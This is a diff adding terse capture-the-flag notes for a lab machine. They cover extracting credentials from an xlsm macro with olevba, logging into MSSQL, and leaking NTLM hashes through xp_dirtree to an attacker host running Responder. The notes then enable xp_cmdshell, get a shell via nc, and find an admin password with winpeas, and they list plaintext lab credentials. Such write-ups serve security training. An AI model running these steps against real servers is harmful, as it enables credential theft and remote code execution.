@@ -1,0 +1,41 @@
+on smb we got a file ==xlsm== so we used ==olevba==
+
+==olevba== file.xlsm
+
+it will give password and username and other details
+
+so we use mssqlclient.oy to connect .. this info is given y hacktricks on port 1433 enumeration
+
+==mssqlclient==.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
+
+==command== on mssql:
+
+SELECT name FROM master.sys.databases
+
+use volume
+
+SELECT name FROM sysobjects WHERE xtype = 'U'
+
+we got nothing . So we now used ==xp_dirtree== and fire ==responder== to get hashes
+
+xp_dirtree '\\10.10.14.14\a'; and get NTLM on responder
+
+using same mssql command to login we get
+
+mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth
+
+there is a command ==xp_cmdshell== whoami to execute command .
+
+if it is turned off use -
+
+```xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;
+
+RECONFIGURE;
+
+EXEC sp_configure 'xp_cmdshell', 1;
+
+RECONFIGURE;
+```
+
+then we sent nc and got a shell and on checking with winpeas we got admin password.
